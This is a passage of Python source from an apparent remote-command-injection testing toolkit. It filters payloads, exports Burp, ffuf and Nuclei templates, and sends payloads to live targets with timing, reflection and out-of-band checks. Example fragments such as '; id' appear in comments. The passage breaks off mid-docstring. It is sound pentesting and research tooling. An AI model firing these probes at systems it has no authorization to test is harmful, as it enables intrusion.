        a url-encoded ``; id`` no longer *looks* separator-led once the ``;`` is
        percent-escaped, but it still fires once the sink decodes it. Conversely
        a bare ``id`` never fires mid-command no matter how it is encoded, so its
        separator-validity must be decided before encoding is applied.
        """
        if environment not in self.separator_envs:
            return True  # non-shell sinks are not command-concatenation points
        if context in SELF_SEPARATING_CONTEXTS:
            return True  # quote break-outs supply their own separator
        return core.startswith(self.command_separators)

    def _filter_by_profile(
        self,
        records: Iterator[PayloadRecord],
        deny_chars: Optional[str] = None,
        max_length: Optional[int] = None,
        needs_separator: bool = False,
        blind: bool = False,
    ) -> Iterator[PayloadRecord]:
        """Keep only payloads a target with this shape could actually accept.

        * ``deny_chars`` / ``max_length`` drop payloads a filter would reject
          (checked on the final wrapped/encoded payload, so a URL-encoded quote
          survives a quote filter because the literal character is gone).
        * ``needs_separator`` (sink concatenates input mid shell command) keeps
          only payloads whose canonical form begins with a command separator, so
          an encoded break-out survives while an encoded bare command does not.
        * ``blind`` (sink returns no output) keeps only payloads confirmable
          out-of-band: timing (blocking) or OOB callbacks.
        """
        denied = set(deny_chars) if deny_chars else set()
        for record in records:
            if max_length and len(record.payload) > max_length:
                continue
            if denied and any(char in record.payload for char in denied):
                continue
            if needs_separator and not record.separator_led:
                continue
            if blind and not (record.blocking or record.oob_host or record.expected_channel == "interactsh"):
                continue
            yield record

    @staticmethod
    def _interleave(records: Iterator[PayloadRecord], key) -> Iterator[PayloadRecord]:
        """Reorder records round-robin across buckets keyed by ``key`` so a
        downstream ``--max-payloads`` cap yields a balanced sample spanning
        categories/environments/sinks instead of exhausting the first bucket
        (the old cap returned only the first category/environment/context).
        Relative order within each bucket is preserved."""
        from collections import deque
        buckets: Dict[Any, "deque"] = {}
        for record in records:
            buckets.setdefault(key(record), deque()).append(record)
        queues = list(buckets.values())
        while queues:
            nxt = []
            for queue in queues:
                yield queue.popleft()
                if queue:
                    nxt.append(queue)
            queues = nxt

    def save_payloads_to_file(
        self,
        file_path: str,
        max_payloads: int = None,
        output_format: str = "text",
        include_metadata: bool = False,
        deny_chars: Optional[str] = None,
        max_length: Optional[int] = None,
        needs_separator: bool = False,
        blind: bool = False,
        request_template: Optional[Dict[str, Any]] = None,
        **kwargs,
    ) -> int:
        """
        Generate payloads and write them in the requested output format.

        Formats: ``text`` / ``jsonl`` (single file, plus a ``.meta.jsonl`` and,
        when correlation tokens are present, a ``.map.jsonl`` sidecar),
        ``burp`` (per-context wordlists + request template for Burp/ffuf), and
        ``nuclei`` (runnable Nuclei templates keyed to the payloads' oracle).

        Returns the number of payloads written.
        """
        output_path = Path(file_path)
        records = self.generate_payload_records(**kwargs)
        if deny_chars or max_length or needs_separator or blind:
            records = self._filter_by_profile(records, deny_chars, max_length, needs_separator, blind)
        # When capping, interleave so the cap samples across the whole corpus
        # rather than exhausting the first category/environment/context.
        if max_payloads:
            records = self._interleave(records, key=lambda r: (r.category, r.environment, r.sink))

        if output_format == "burp":
            return self._write_burp(output_path, records, max_payloads, request_template)
        if output_format == "ffuf":
            return self._write_ffuf(output_path, records, max_payloads, request_template)
        if output_format == "nuclei":
            return self._write_nuclei(output_path, records, max_payloads, request_template)

        count = 0
        manifest: List[Dict[str, Any]] = []
        metadata_path = output_path.with_suffix(f"{output_path.suffix}.meta.jsonl")
        map_path = output_path.with_suffix(f"{output_path.suffix}.map.jsonl")
        try:
            with output_path.open("w", encoding="utf-8") as file:
                metadata_file = metadata_path.open("w", encoding="utf-8") if include_metadata and output_format == "text" else None
                # Text output is a plain wordlist, so collapse duplicate payload
                # lines that the per-environment records now produce; jsonl and
                # the .map/.meta sidecars keep every record so multi-environment
                # provenance is preserved.
                text_seen: Set[str] = set()
                try:
                    for record in records:
                        serialized = json.dumps(asdict(record), ensure_ascii=True)
                        if output_format == "jsonl":
                            file.write(serialized + "\n")
                            wrote = True
                        elif record.payload in text_seen:
                            wrote = False
                        else:
                            file.write(record.payload + "\n")
                            if metadata_file:
                                metadata_file.write(serialized + "\n")
                            text_seen.add(record.payload)
                            wrote = True
                        if record.token or record.match:
                            manifest.append({
                                "token": record.token,
                                "oob_host": record.oob_host,
                                "payload": record.payload,
                                "category": record.category,
                                "environment": record.environment,
                                "context": record.context,
                                "sink": record.sink,
                                "encoding": record.encoding,
                                "expected_channel": record.expected_channel,
                                "indicator": record.indicator,
                                "match": record.match,
                                "destructive": record.destructive,
                            })
                        if wrote:
                            count += 1
                            if max_payloads and count >= max_payloads:
                                break
                finally:
                    if metadata_file:
                        metadata_file.close()

            if manifest:
                with map_path.open("w", encoding="utf-8") as map_file:
                    for entry in manifest:
                        map_file.write(json.dumps(entry, ensure_ascii=True) + "\n")

            if count:
                logger.info("Successfully generated %s payloads to %s", count, output_path)
            else:
                # "Successfully generated 0 payloads" reads as a target with
                # nothing to fire at. Far more often it is a selector that
                # matched nothing, and the operator needs to hear the
                # difference before they conclude anything from the run.
                logger.warning(
                    "No payloads matched the selection -- %s is empty. Check "
                    "--contexts/--categories/--encodings/--environments and any "
                    "--target-profile filters (--deny-chars, --max-length).",
                    output_path)
            if include_metadata and output_format == "text":
                logger.info("Metadata sidecar written to %s", metadata_path)
            if manifest:
                logger.info("Correlation map (token -> payload) written to %s", map_path)
        except Exception as exc:
            # Never report a partial or absent wordlist as a successful run: the
            # file IS the deliverable, so a write failure has to reach the
            # caller and the process exit status, not just the log.
            logger.error("Error writing to file %s: %s", output_path, exc)
            raise

        return count

    def _format_outdir(self, output_path: Path, suffix: str) -> Path:
        """Derive an output directory name for multi-file formats."""
        return output_path.with_name(f"{output_path.stem or 'rce_payloads'}_{suffix}")

    def _render_request(self, req: Optional[Dict[str, Any]], url_sub: str, other_sub: str, host: str) -> Optional[str]:
        """Render a profile `request` block into a raw HTTP request, substituting
        the FUZZ marker in the URL (with `url_sub`) and in headers/body (with
        `other_sub`). Returns None if no usable request/marker is present."""
        if not req or not req.get("url"):
            return None
        body = req.get("body") or ""
        headers = req.get("headers") or {}
        if "FUZZ" not in req["url"] and "FUZZ" not in body and not any("FUZZ" in str(v) for v in headers.values()):
            return None
        from urllib.parse import urlsplit
        method = (req.get("method") or ("POST" if body else "GET")).upper()
        parts = urlsplit(req["url"])
        path = parts.path or "/"
        if parts.query:
            path += "?" + parts.query
        resolved_host = host or parts.netloc or "TARGET-HOST"
        lines = [f"{method} {path.replace('FUZZ', url_sub)} HTTP/1.1", f"Host: {resolved_host}"]
        for key, value in headers.items():
            lines.append(f"{key}: {str(value).replace('FUZZ', other_sub)}")
        rendered = "\n".join(lines)
        if body:
            rendered += "\n\n" + body.replace("FUZZ", other_sub)
        return rendered

    def _write_wordlists(self, outdir: Path, records: Iterator[PayloadRecord],
                         max_payloads: Optional[int]) -> Tuple[int, Dict[str, List[str]]]:
        """Write deduplicated, watermark-free payload wordlists grouped by
        injection context (``payloads-<context>.txt`` plus a combined
        ``payloads-all.txt``). Whatever encodings the caller selected are honoured
        as-is — the wordlist is the literal set of strings to fuzz with, so a
        ``base64_decode_exec`` or ``random_case`` variant (which Burp/ffuf cannot
        reproduce with a processing rule) is kept rather than silently dropped.
        For a raw-only list, generate with ``--encodings none``.
        """
        groups: Dict[str, List[str]] = {}
        seen: Set[str] = set()
        count = 0
        for record in records:
            if record.payload in seen:
                continue
            seen.add(record.payload)
            groups.setdefault(record.context, []).append(record.payload)
            count += 1
            if max_payloads and count >= max_payloads:
                break
        for context_name, items in groups.items():
            (outdir / f"payloads-{context_name}.txt").write_text("\n".join(items) + "\n", encoding="utf-8")
        all_items = [p for items in groups.values() for p in items]
        (outdir / "payloads-all.txt").write_text("\n".join(all_items) + "\n", encoding="utf-8")
        return count, groups

    def _write_burp(self, output_path: Path, records: Iterator[PayloadRecord], max_payloads: Optional[int],
                    request_template: Optional[Dict[str, Any]] = None) -> int:
        """Write context-split payload wordlists for Burp Intruder.

        A ``request.txt`` (with Burp's ``\xa7...\xa7`` position marker) is written
        only when a target profile supplies a real request; without one Burp users
        set the injection point themselves from a captured request, so no generic
        placeholder request is emitted.
        """
        outdir = self._format_outdir(output_path, "burp")
        outdir.mkdir(parents=True, exist_ok=True)
        count = 0
        try:
            count, groups = self._write_wordlists(outdir, records, max_payloads)
            rendered = self._render_request(request_template, "\xa7payload\xa7", "\xa7payload\xa7", "")
            if rendered:
                (outdir / "request.txt").write_text(
                    "# Burp Intruder: load payloads-*.txt as a payload set; the \xa7...\xa7\n"
                    "# marker below is the injection point from your target profile.\n"
                    + rendered + "\n", encoding="utf-8")
                hint = "request.txt from the target profile"
            else:
                hint = "set the payload position in Burp from your captured request"
            logger.info("Burp wordlists written to %s/ (%s payloads across %s context files; %s)",
                        outdir, count, len(groups), hint)
        except Exception as exc:
            logger.error("Error writing Burp output to %s: %s", outdir, exc)
            raise
        return count

    def _write_ffuf(self, output_path: Path, records: Iterator[PayloadRecord], max_payloads: Optional[int],
                    request_template: Optional[Dict[str, Any]] = None) -> int:
        """Write ffuf wordlists plus, when a target profile supplies a request
        with a concrete host, a ready-to-run ``request.txt`` (with a real ``FUZZ``
        marker) and ``run.sh``.

        Without a request/injection point — or with only a path-only URL that
        can't name the target host — ffuf has nothing runnable to point at, so
        only the wordlists are written, any stale request/runner is removed, and
        the caller is warned. No unusable placeholder request is fabricated.
        """
        from urllib.parse import urlsplit
        outdir = self._format_outdir(output_path, "ffuf")
        outdir.mkdir(parents=True, exist_ok=True)
        request_path = outdir / "request.txt"
        run_path = outdir / "run.sh"
        count = 0
        try:
            count, _ = self._write_wordlists(outdir, records, max_payloads)
            rendered = self._render_request(request_template, "FUZZ", "FUZZ", "")
            # ffuf parses the Host from the raw request itself, so a runnable
            # export needs a concrete host — a path-only profile URL only yields a
            # `Host: TARGET-HOST` placeholder, which would run against nothing.
            parts = urlsplit((request_template or {}).get("url", "") if request_template else "")
            if rendered and parts.netloc:
                request_path.write_text(rendered + "\n", encoding="utf-8")
                run_path.write_text(
                    "#!/bin/sh\n"
                    f"ffuf -request request.txt -w payloads-all.txt -request-proto {parts.scheme or 'https'}\n",
                    encoding="utf-8")
                run_path.chmod(0o755)
                logger.info("ffuf export written to %s/ (%s payloads; request.txt + run.sh ready)", outdir, count)
            else:
                # Wordlist-only: never leave a stale runnable request behind from a
                # previous profile-backed run against a different target.
                request_path.unlink(missing_ok=True)
                run_path.unlink(missing_ok=True)
                logger.warning(
                    "ffuf export: no runnable request (needs a --target-profile whose `request.url` is an "
                    "absolute URL including the host, e.g. https://target.example/path, with a FUZZ marker), "
                    "so only wordlists were written to %s/.", outdir)
        except Exception as exc:
            logger.error("Error writing ffuf output to %s: %s", outdir, exc)
            raise
        return count

    def _write_nuclei(self, output_path: Path, records: Iterator[PayloadRecord], max_payloads: Optional[int],
                      request_template: Optional[Dict[str, Any]] = None) -> int:
        """Emit Nuclei templates grouped by environment and oracle (OOB / time-based / reflection)."""
        # A profile request block shapes the raw request; otherwise a generic
        # GET ?rcekit=<payload> is used.
        raw_request = self._render_request(request_template, "{{url_encode(payload)}}", "{{payload}}", "{{Hostname}}")
        outdir = self._format_outdir(output_path, "nuclei")
        outdir.mkdir(parents=True, exist_ok=True)
        canary = "RCEKITCANARY"
        groups: "Dict[Tuple[str, str], List[str]]" = {}
        seen: "Dict[Tuple[str, str], Set[str]]" = {}
        sleep_tokens = ("sleep", "timeout", "start-sleep", "pg_sleep", "thread.sleep", "time.sleep")
        count = 0
        for record in records:
            # Nuclei url-encodes the payload itself, so only the unencoded form
            # is meaningful (and encoded blobs would hide the OOB host).
            if record.encoding != "none":
                continue
            # Without a custom request the payload goes into a generic URL
            # parameter, so only the raw context applies. With a profile request
            # block the template defines the injection point, so honour whatever
            # context the profile selected (e.g. a JSON-escaped body value).
            if raw_request is None and record.context != "raw":
                continue
            payload = record.payload
            lower = payload.lower()
            if record.oob_host:
                payload = payload.replace(record.oob_host, "{{interactsh-url}}")
                oracle = "oob"
            elif any(t in lower for t in sleep_tokens) and "tail" not in lower:
                # Only bounded sleeps give a reliable duration matcher; normalise
                # every delay to 6 seconds so "duration>=6" is meaningful.
                payload = re.sub(r"(?i)(sleep\s+)\d+", r"\g<1>6", payload)
                payload = re.sub(r"(?i)(-seconds\s+)\d+", r"\g<1>6", payload)
                payload = re.sub(r"(?i)(/t\s+)\d+", r"\g<1>6", payload)
                payload = re.sub(r"(?i)(pg_sleep\()\d+", r"\g<1>6", payload)
                oracle = "time"
            elif record.token and record.mode == "detection":
                payload = payload.replace(record.token, canary)
                oracle = "reflect"
            else:
                continue
            key = (record.environment, oracle)
            bucket = seen.setdefault(key, set())
            if payload in bucket:
                continue
            bucket.add(payload)
            groups.setdefault(key, []).append(payload)
            count += 1
            if max_payloads and count >= max_payloads:
                break
        try:
            for (env, oracle), payloads in groups.items():
                template = self._nuclei_template(env, oracle, payloads, canary, raw_request)
                (outdir / f"rcekit-{env}-{oracle}.yaml").write_text(template, encoding="utf-8")
            logger.info("Nuclei templates written to %s/ (%s templates, %s payloads)", outdir, len(groups), count)
        except Exception as exc:
            logger.error("Error writing Nuclei output to %s: %s", outdir, exc)
            raise
        return count

    def _nuclei_template(self, env: str, oracle: str, payloads: List[str], canary: str,
                         raw_request: Optional[str] = None) -> str:
        plist = "\n".join(f"          - {json.dumps(p)}" for p in payloads)
        if raw_request:
            request_lines = "\n".join(f"        {line}" for line in raw_request.split("\n")) + "\n\n"
            request_desc = "the request defined by the target profile"
        else:
            request_lines = "        GET /?rcekit={{url_encode(payload)}} HTTP/1.1\n        Host: {{Hostname}}\n\n"
            request_desc = "a URL parameter"
        if oracle == "oob":
            name = f"Out-of-band RCE probe ({env})"
            matcher = (
                "    matchers:\n"
                "      - type: word\n"
                "        part: interactsh_protocol\n"
                "        words:\n"
                "          - \"dns\"\n"
                "          - \"http\""
            )
        elif oracle == "time":
            name = f"Time-based blind RCE probe ({env})"
            matcher = (
                "    matchers:\n"
                "      - type: dsl\n"
                "        dsl:\n"
                "          - \"duration>=6\""
            )
        else:
            name = f"Reflected RCE probe ({env})"
            matcher = (
                "    matchers:\n"
                "      - type: word\n"
                "        part: body\n"
                "        words:\n"
                f"          - \"{canary}\""
            )
        return (
            f"id: rcekit-{env}-{oracle}\n\n"
            "info:\n"
            f"  name: {name}\n"
            "  author: rcekit\n"
            "  severity: high\n"
            f"  description: Injects {env} RCE payloads into {request_desc} and confirms execution via the {oracle} oracle.\n"
            f"  tags: rce,rcekit,{env},{oracle}\n\n"
            "http:\n"
            "  - raw:\n"
            "      - |\n"
            f"{request_lines}"
            "    payloads:\n"
            "      payload:\n"
            f"{plist}\n"
            "    attack: batteringram\n"
            "    stop-at-first-match: true\n\n"
            f"{matcher}\n"
        )

    # Injection-location encoders for live verification. Each turns the canonical
    # payload (the exact bytes the sink must receive) into the on-the-wire form
    # for one injection point, so the delivery layer never corrupts it:
    #   * query_value / url_path — percent-encode; the server URL-decodes it back.
    #   * form_value             — form percent-encode (x-www-form-urlencoded body).
    #   * json_string            — JSON string escaping ONLY. A JSON body is not
    #                              percent-decoded, so percent-encoding here would
    #                              hand the sink the literal "%3B%20id" instead of
    #                              "; id" and the oracle would never fire.
    #   * header                 — keep the payload on one header line (strip CR/LF).
    #   * xml_text / xml_attr    — XML character escaping, for the same reason
    #                              json_string escapes rather than percent-encodes:
    #                              the target's parser undoes it, so the sink
    #                              receives "a && b" from "a &amp;&amp; b". Left
    #                              raw, a single "&" or "<" in a payload makes the
    #                              body not-well-formed and the request is rejected
    #                              before anything reads the value. The attribute
    #                              form also escapes both quotes, which would
    #                              otherwise close the attribute early.
    #   * xml_cdata              — nothing inside CDATA is escaped, so only the one
    #                              sequence that *ends* the section is handled, by
    #                              splitting it across a section boundary. The bytes
    #                              the sink receives are unchanged.
    #   * raw                    — send verbatim (unknown/custom body).
    _INJECTION_ENCODERS = {
        "query_value": lambda p: urllib.parse.quote(p, safe=""),
        "url_path": lambda p: urllib.parse.quote(p, safe="/"),
        "form_value": lambda p: urllib.parse.quote_plus(p),
        "json_string": lambda p: json.dumps(p)[1:-1],
        "header": lambda p: p.replace("\r", " ").replace("\n", " "),
        "xml_text": lambda p: (p.replace("&", "&amp;").replace("<", "&lt;")
                               .replace(">", "&gt;")),
        "xml_attr": lambda p: (p.replace("&", "&amp;").replace("<", "&lt;")
                               .replace(">", "&gt;").replace('"', "&quot;")
                               .replace("'", "&apos;")),
        "xml_cdata": lambda p: p.replace("]]>", "]]]]><![CDATA[>"),
        "raw": lambda p: p,
    }

    def _encode_for_location(self, payload: str, location: str) -> str:
        encoder = self._INJECTION_ENCODERS.get(location)
        if encoder is None:
            raise ValueError(f"Unknown injection location: {location!r}")
        return encoder(payload)

    @staticmethod
    def _content_type(headers: Optional[List[str]]) -> str:
        for header in headers or []:
            name, _, value = header.partition(":")
            if name.strip().lower() == "content-type":
                return value.strip().lower()
        return ""

    @staticmethod
    def _xml_mark_location(data: str, mark: str) -> Optional[str]:
        """Which XML escaping the marker's position needs, or ``None`` when it
        is not inside a value this scanner recognises.

        An XML body needs the encoding chosen per *position*, not per body: a
        payload in an attribute has to escape the quote that delimits it, one
        in character data does not, and one inside CDATA must not be escaped at
        all or the sink receives `&amp;&amp;` literally. The marker is already
        in the body by the time this is asked, so its offset answers the
        question without the location having to be threaded through every
        caller -- and a hand-written ``--verify-data`` envelope with an inline
        FUZZ gets the same treatment as an enumerated point."""
        index = (data or "").find(mark)
        if index < 0:
            return None
        for kind, _path, start, end in _xml_value_spans(data or ""):
            if start <= index and index + len(mark) <= end:
                # The span kinds are named so this is the encoder key:
                # text -> xml_text, attr -> xml_attr, cdata -> xml_cdata.
                return f"xml_{kind}"
        return None

    def _detect_body_location(self, data: Optional[str], headers: Optional[List[str]],
                              mark: str = "FUZZ") -> str:
        """Pick the on-the-wire encoding for a payload injected into the request
        body, from the Content-Type header first, then the body's own shape."""
        ctype = self._content_type(headers)
        if "json" in ctype:
            return "json_string"
        if "x-www-form-urlencoded" in ctype:
            return "form_value"
        stripped = (data or "").strip()
        if stripped[:1] in "{[":
            return "json_string"
        if starts_xml_body(stripped) or "xml" in ctype:
            # Before the form test, which an envelope would not match anyway,
            # and after the JSON ones so a `<` inside a JSON string cannot
            # claim the body. A body that says XML and carries no recognisable
            # span falls through to `raw` rather than guessing an escaping.
            located = self._xml_mark_location(data or "", mark)
            if located is not None:
                return located
        if re.match(r"^[^\s=&]+=[^&]*(&[^\s=&]+=[^&]*)*$", stripped):
            return "form_value"
        return "raw"

    def _build_verify_request(
        self,
        payload: str,
        url: str,
        data: Optional[str],
        headers: Optional[List[str]],
        url_location: str,
        body_location: str,
        mark: str = "FUZZ",
    ) -> Tuple[str, Optional[bytes], Dict[str, str]]:
        """Render one verification request, encoding the payload independently
        for each injection point it lands in (URL / body / header). This replaces
        the old blanket URL-encoding, which corrupted JSON bodies and
        double-encoded already-encoded payloads."""
        target = url.replace(mark, self._encode_for_location(payload, url_location))
        body: Optional[bytes] = None
        if data is not None:
            body = data.replace(mark, self._encode_for_location(payload, body_location)).encode()
        hdrs: Dict[str, str] = {"User-Agent": "rcekit-verify"}
        for header in headers or []:
            name, _, value = header.partition(":")
            hdrs[name.strip()] = value.strip().replace(mark, self._encode_for_location(payload, "header"))
        return target, body, hdrs

    def _evaluate_verify(self, record: PayloadRecord, status: Optional[int], body: str,
                         elapsed: float, baseline: float, margin: float = 2.0,
                         control_body: str = "", elapsed_confirm: Optional[float] = None) -> Tuple[str, str]:
        """Apply the payload's built-in oracle to a target response.

        The verdicts are *differential* so ``executed`` means execution, not
        coincidence:

        * **timing** — a candidate delay must clear ``baseline`` by ``margin``
          (a noise-aware threshold that adapts to the payload's own
          ``expected_delay_ms``, not a fixed constant) *and* reproduce on a
          second fire (``elapsed_confirm``); a one-off slow response is jitter,
          not a sleep, and is reported ``no-delay``. A request that hangs past
          the timeout (``status is None``) is itself a signal for a sleep
          payload — reported ``timing-candidate-on-timeout`` rather than a flat
          ``error`` — since the timeout may be the expected delay.
        * **reflection** — a ``match`` that is also present in ``control_body``
          is not evidence of execution, so it is reported ``inconclusive``
          rather than a false ``executed``. For a canary token the caller
          supplies a *same-token* control (the token in an inert, non-executing
          carrier), so a target that merely echoes input cannot masquerade as
          execution; for a command-output signature the control is the
          payload-free baseline response.
        """
        # OOB is confirmed out-of-band, so a timed-out delivery request does not
        # change the verdict — check it before the generic status==None error.
        if record.expected_channel == "interactsh":
            return "oob-pending", f"watch token {record.token} at your OOB listener"
        if record.expected_channel == "timing" or record.blocking:
            if status is None:
                # The delivery request hung past the timeout. For a sleep payload
                # that hang is the signal, but we could not measure it, so flag a
                # candidate the operator can confirm with a larger --verify-timeout.
                if elapsed - baseline >= margin:
                    return "timing-candidate-on-timeout", (
                        f"request hung {elapsed:.1f}s (>= timeout) vs baseline {baseline:.1f}s; "
                        "raise --verify-timeout above the expected delay to confirm")
                return "error", body[:80]
            if elapsed - baseline < margin:
                return "no-delay", f"{elapsed:.1f}s vs baseline {baseline:.1f}s (needs +{margin:.1f}s)"
            if elapsed_confirm is not None and elapsed_confirm - baseline < margin:
                return "no-delay", (f"delay {elapsed:.1f}s did not reproduce on re-fire "
                                    f"({elapsed_confirm:.1f}s vs baseline {baseline:.1f}s)")
            return "executed", f"delay {elapsed:.1f}s vs baseline {baseline:.1f}s (margin {margin:.1f}s)"
        if status is None:
            return "error", body[:80]
        if record.match:
            if self._encoded_search(record.match, body):
                if control_body and self._encoded_search(record.match, control_body):
                    if record.token:
                        return "inconclusive", ("canary reflected by the target in an inert control "
                                                "(no execution needed), so the match is not proof")
                    return "inconclusive", f"signature /{record.match}/ also present without the payload"
                return "executed", f"matched /{record.match}/"
            return "no-match", ""
        return "no-signature", "no machine-readable oracle for this payload"

    def _encoded_search(self, pattern: str, body: str) -> bool:
        """Match ``pattern`` against the response body AND against it after peeling
        common output wrappers. A sink that base64/hex-encodes, URL-encodes,
        HTML-escapes, or JSON/unicode-escapes the command output would otherwise
        hide a genuine hit (e.g. ``dWlkPTA=`` instead of ``uid=0``). Every decode
        is best-effort and additive: the raw body is always checked first, so this
        only ever turns a missed confirmation into a hit, never the reverse."""
        import base64, binascii, html as _html, urllib.parse, codecs
        if re.search(pattern, body):
            return True
        candidates: List[str] = []
        try:
            candidates.append(urllib.parse.unquote(body))
        except Exception:
            pass
        try:
            candidates.append(_html.unescape(body))
        except Exception:
            pass
        try:
            candidates.append(codecs.decode(body, "unicode_escape"))
        except Exception:
            pass
        for token in re.findall(r"[A-Za-z0-9+/]{16,}={0,2}", body):
            try:
                decoded = base64.b64decode(token + "=" * (-len(token) % 4)).decode("utf-8", "replace")
                candidates.append(decoded)
            except (binascii.Error, ValueError):
                continue
        for token in re.findall(r"(?:[0-9a-fA-F]{2}){8,}", body):
            try:
                candidates.append(bytes.fromhex(token).decode("utf-8", "replace"))
            except ValueError:
                continue
        return any(re.search(pattern, c) for c in candidates)

    def _json_leaf_channels(self, body: str, limit: int = 256,
                            max_depth: int = 64) -> List[Tuple[str, str]]:
        """One channel per leaf of a JSON response body, addressed by its path.

        Substring-matching the serialised JSON misses a value the encoder split
        or escaped — ``"12\\u002f34"``, a number rendered inside a deeply nested
        error envelope — so the parsed leaves are searched as their own decoded
        strings. API targets surface an evaluator's output in exactly that
        shape: ``{"error": {"detail": "cannot render 2058898001"}}``.

        Booleans and nulls carry no computed value and are skipped. ``limit``
        caps the number of leaves and ``max_depth`` the nesting descended, so a
        pathological response cannot turn one probe into an unbounded search.

        The walk is iterative, and ``json.loads`` — whose scanner recurses in C
        — may raise ``RecursionError`` on a deeply nested body. Treating that as
        "no JSON channels" rather than letting it propagate matters more than it
        looks: the caller builds channels inside the delivery try/except, so an
        escaping exception would report a response that arrived perfectly well
        as a failed request. A target could then hide a live sink behind a
        thousand nested arrays."""
        try:
            parsed = json.loads(body)
        except (ValueError, TypeError, RecursionError):
            return []
        leaves: List[Tuple[str, str]] = []
        # (node, path, depth), LIFO with children pushed in reverse so leaves come
        # out in document order and the evidence path is stable between runs.
        stack: List[Tuple[Any, str, int]] = [(parsed, "", 0)]
        while stack and len(leaves) < limit:
            node, path, depth = stack.pop()
            if depth > max_depth:
                continue
            if isinstance(node, dict):
                for key, value in reversed(list(node.items())):
                    stack.append((value, f"{path}.{key}" if path else str(key), depth + 1))
            elif isinstance(node, list):
                for index in range(len(node) - 1, -1, -1):
                    stack.append((node[index], f"{path}[{index}]", depth + 1))
            elif isinstance(node, str) or isinstance(node, (int, float)) and not isinstance(node, bool):
                leaves.append((f"JSON field {path or '(root)'}", str(node)))
        return leaves

    def _response_channels(self, headers: Iterable[Tuple[str, str]], body: str,
                           reason: Optional[str] = None, final_url: Optional[str] = None,
                           requested_url: Optional[str] = None) -> List[Tuple[str, str]]:
        """Every place in one response where a computed value could surface,
        as ordered ``(channel name, text)`` pairs.

        Searching the body alone reports a genuinely vulnerable target as
        negative whenever the sink's output lands somewhere else — a debug
        header, a ``Set-Cookie`` value, the target of a redirect, an HTTP reason
        phrase, or a leaf of a JSON error envelope are all real sinks. The body
        stays first so the common case keeps its existing evidence line, and the
        differential rule is unchanged: whatever channel carries the value, the
        payload-free control must not carry it.

        Transport headers are skipped (see ``NON_APPLICATION_HEADERS``)."""
        channels: List[Tuple[str, str]] = [("response body", body)]
        for name, value in headers:
            if name.lower() in NON_APPLICATION_HEADERS:
                continue
            channels.append((f"header {name}", value))
            if name.lower() == "set-cookie":
                crumb = value.split(";", 1)[0]
                cookie_name, _, cookie_value = crumb.partition("=")
                if cookie_value:
                    channels.append((f"cookie {cookie_name.strip()}", cookie_value.strip()))
        # urllib follows redirects, so the Location header of an intermediate hop
        # is already gone by the time we see a response. The URL we actually
        # landed on preserves it, which is what a sink reflecting into a redirect
        # target looks like from here.
        if final_url and requested_url and final_url != requested_url:
            channels.append(("redirect target", final_url))
        if reason:
            channels.append(("reason phrase", str(reason)))
        channels.extend(self._json_leaf_channels(body))
        return channels

    def _fire(self, payload: str, url: str, method: str, data: Optional[str],
              headers: Optional[List[str]], url_location: str, body_location: str,
              timeout: float) -> Tuple[Optional[int], str, float]:
        """Deliver one request and return ``(status, body, elapsed)``.

        The body-only view of :meth:`_fire_channels`, kept for callers whose
        oracle reads the body alone (the classic ``run_verification`` path)."""
        status, body, _channels, elapsed = self._fire_channels(
            payload, url, method, data, headers, url_location, body_location, timeout)
        return status, body, elapsed

    def _fire_channels(self, payload: str, url: str, method: str, data: Optional[str],
                       headers: Optional[List[str]], url_location: str, body_location: str,
                       timeout: float) -> Tuple[Optional[int], str, List[Tuple[str, str]], float]:
        """Deliver one request with ``payload`` substituted at the FUZZ marker(s),
        encoded independently for each injection point. Returns
        ``(status, body, channels, elapsed)`` — ``status`` is ``None`` on a
        delivery error or timeout, in which case ``channels`` is empty. Shared
        delivery layer for ``run_verification`` and the method-driven detection
        engine so both encode payloads identically.

        A non-2xx response is read, not discarded: many evaluators surface the
        computed value only in a 500 stack trace or a 400 validation error, so
        an early exit on status would silently suppress a whole class of
        confirmations."""
        import time
        import urllib.request
        import urllib.error
        target, body, hdrs = self._build_verify_request(
            payload, url, data, headers, url_location, body_location)
        request = urllib.request.Request(target, data=body, headers=hdrs, method=method)
        # The context is built whatever the scheme: urllib follows a redirect
        # with the handler it was given, so an http:// target that lands on a
        # self-signed or legacy https:// one still needs it. Only the *notice*
        # waits to learn whether TLS was really used.
        context = self._verify_ssl_context()
        self._announce_insecure(target)
        start = time.time()
        try:
            with urllib.request.urlopen(request, timeout=timeout, context=context) as response:
                # A redirect may have taken this to TLS after all.
                self._announce_insecure(getattr(response, "url", None))
                text = decode_response_body(
                    response.read(), response.headers.get("Content-Encoding"))
                return (response.status, text, self._channels_from_response(response, text, target),
                        time.time() - start)
        except urllib.error.HTTPError as exc:
            # An HTTPError still came off a connection, and it carries the
            # URL it finally reached.
            self._announce_insecure(getattr(exc, "url", None))
            # Reading the error body can itself fail: a target that truncates
            # its own error response -- a Content-Length it never delivers,
            # then a reset -- raises here, mid-`except`. An exception raised
            # inside an except block is NOT caught by the sibling handler
            # below, so without this guard one malformed error response ends
            # the whole run and every probe fired so far is lost. The status
            # is what the caller needs most; an unreadable body is a body we
            # report as empty, exactly as a delivery failure would.
            try:
                text = decode_response_body(
                    exc.read(), exc.headers.get("Content-Encoding"))
            except Exception:
                text = ""
            return (exc.code, text, self._channels_from_response(exc, text, target),
                    time.time() - start)
        except Exception as exc:  # network error, timeout, etc.
            return None, str(exc), [], time.time() - start

    def _channels_from_response(self, response: Any, text: str,
                                requested_url: str) -> List[Tuple[str, str]]:
        """Adapt a urllib response (or an ``HTTPError``, which is one) to
        :meth:`_response_channels`. Every attribute is read defensively: a
        response object that is missing one must cost a channel, never a
        traceback in the middle of a live engagement.

        This must never raise. The caller builds channels inside the delivery
        try/except, so an exception here would be caught as a network failure
        and a response that arrived perfectly well would be reported as though
        it never reached the target — an `error` verdict on a live sink. A
        response that was delivered always yields at least its body."""
        try:
            try:
                header_items = list(getattr(response, "headers", None).items())
            except Exception:
                header_items = []
            return self._response_channels(
                header_items, text,
                reason=getattr(response, "reason", None),
                final_url=getattr(response, "url", None),
                requested_url=requested_url)
        except Exception:
            return [("response body", text)]

    def _verify_ssl_context(self):
        """SSL context for verification/detection requests. Returns ``None``
        (urllib's default, certificate-verifying) unless ``--insecure`` was set,
        in which case certificate verification is disabled — self-signed or
        hostname-mismatched certs are the norm on internal pentest targets, so
        this is an explicit operator opt-in, not a default. Ignored for HTTP.

        Turning verification off is not enough to *reach* an old target.
        OpenSSL 3.x ships security level 2, which refuses the key sizes and
        signature algorithms that software of the era this tool gets pointed at
        still offers. Webmin 1.910 — the target the README's `reflected` row
        rests on — answers a modern client with ``SSLV3_ALERT_HANDSHAKE_FAILURE``
        and nothing else. Every probe then comes back `error`: correct, and
